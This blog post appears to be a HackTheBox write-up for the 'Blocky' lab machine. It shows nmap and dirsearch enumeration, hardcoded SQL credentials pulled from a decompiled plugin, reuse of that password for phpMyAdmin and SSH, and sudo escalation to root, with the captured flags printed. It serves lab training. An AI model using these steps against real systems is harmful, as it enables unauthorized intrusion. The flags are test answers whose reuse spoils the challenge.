---
layout: post
title: HackTheBox Blocky
date: 2017-07-21
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this, it exposes a massive potential attack vector: Minecraft. Tens of thousands of servers exist that are publicly accessible, with the vast majority being set up and configured by young and inexperienced system administrators. ([Source](https://www.hackthebox.com/machines/blocky))

# Enumeration

```bash
┌──(root💀shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.37
Nmap scan report for 10.10.10.37
Host is up (0.0038s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Device type: general purpose|WAP|specialized|storage-misc|broadband router|printer
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (94%), Asus embedded (90%), Crestron 2-Series (89%), HP embedded (89%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.4 (94%), Linux 4.2 (93%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8192/tcp)
HOP RTT     ADDRESS
1   3.66 ms 10.10.14.1
2   3.67 ms 10.10.10.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.45 seconds
```

It seems like there’s an FTP port open.

```bash
┌──(root💀shiro)-[/home/shiro]
└─# ftp 10.10.10.37                                    
Connected to 10.10.10.37.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
Name (10.10.10.37:shiro): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
ftp> ls
530 Please login with USER and PASS
530 Please login with USER and PASS
ftp: Can't bind for data connection: Address already in use
```

We can’t seem to get any access to the FTP server. 

## Website

![Website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/Website.png?raw=true)

It seems like the website is running on WordPress! Used `dirsearch` to check for interesting directories.

```bash
┌──(root💀shiro)-[/home/shiro]
└─# dirsearch -u 10.10.10.37:80     
...
[11:25:57] 301 -  315B  - /phpmyadmin  ->  http://10.10.10.37/phpmyadmin/
[11:25:58] 200 -   10KB - /phpmyadmin/
[11:25:58] 200 -   10KB - /phpmyadmin/index.php
[11:25:58] 301 -  312B  - /plugins  ->  http://10.10.10.37/plugins/
[11:25:58] 200 -  745B  - /plugins/
[11:26:00] 200 -    7KB - /readme.html
[11:26:07] 301 -  313B  - /wp-admin  ->  http://10.10.10.37/wp-admin/
[11:26:07] 301 -  315B  - /wp-content  ->  http://10.10.10.37/wp-content/
[11:26:07] 200 -    0B  - /wp-config.php
[11:26:07] 200 -    0B  - /wp-content/
[11:26:07] 200 -    1B  - /wp-admin/admin-ajax.php
[11:26:07] 200 -  965B  - /wp-content/uploads/
[11:26:07] 302 -    0B  - /wp-admin/  ->  http://10.10.10.37/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.37%2Fwp-admin%2F&reauth=1
[11:26:07] 301 -  316B  - /wp-includes  ->  http://10.10.10.37/wp-includes/
[11:26:07] 200 -    0B  - /wp-cron.php
[11:26:07] 200 -   40KB - /wp-includes/
[11:26:07] 200 -    2KB - /wp-login.php
[11:26:07] 302 -    0B  - /wp-signup.php  ->  http://10.10.10.37/wp-login.php?action=register
...
```

Seems like there are some interesting pages called `wp-login.php`, `wp-admin`, `phpmyadmin` and `plugins`! Let’s check it out~

### WordPress Login Page

![Wordpress_Login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/Wordpress_Login.png?raw=true)

Default credentials didn’t work.

### WordPress Admin Page

![Wordpress_Admin](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/Wordpress_Admin.png?raw=true)

This was just a redirect back to `wp-login.php`

### PHPMyAdmin Page

![PHPMyAdmin_Page](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/PHPMyAdmin_Page.png?raw=true)

Default credentials did not work here as well.

### Plugins Page

![Plugins](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/Plugins.png?raw=true)

However, there were some interesting files on `/upload` directory. Downloaded them to inspect it with `jd-gui`.

![BlockyCore_Decompiled](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/BlockyCore_Decompiled.png?raw=true)

There is some interesting information inside the class file!

```java
public String sqlUser = "root";
public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

Since the box does not have any `SQL` service open, can we assume that there’s some password reuse?  Trying the credentials on the `phpmyadmin` page worked!

![PHPMyAdmin_Login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/PHPMyAdmin_Login.png?raw=true)

# Exploitation

There was a user credentials on `wp_users table`: `username:notch` and `password hash:$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/`

![PHPMyAdmin_Users](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Blocky/PHPMyAdmin_Users.png?raw=true)

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Blocky]
└─# cat hash.txt    
notch:$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/                                                                                              
┌──(root💀shiro)-[/home/shiro/HackTheBox/Blocky]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
```

It seems like the password hash could not be cracked. However, I remembered that there was a `ssh` port open. Logging in to SSH with the credentials `notch:8YsqfCTnvxAUeduzjNSXe22` worked.

```bash
┌──(shiro㉿shiro)-[/home/shiro/HackTheBox/Blocky]
└─$ ssh notch@10.10.10.37  
...
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt
59fee0977fb60b8a0bc6e41e751f3cd5
```

# Privilege Escalation

Before trying out anything, we should always check what commands the user is allowed to run with `sudo -l`

```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Well… lucky for us, `notch` can run all commands as `sudo`.

```bash
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# id
uid=0(root) gid=0(root) groups=0(root)
root@Blocky:/home/notch# cat /root/root.txt 
0a9694a5b4d272c694679f7860f1cd5f
```
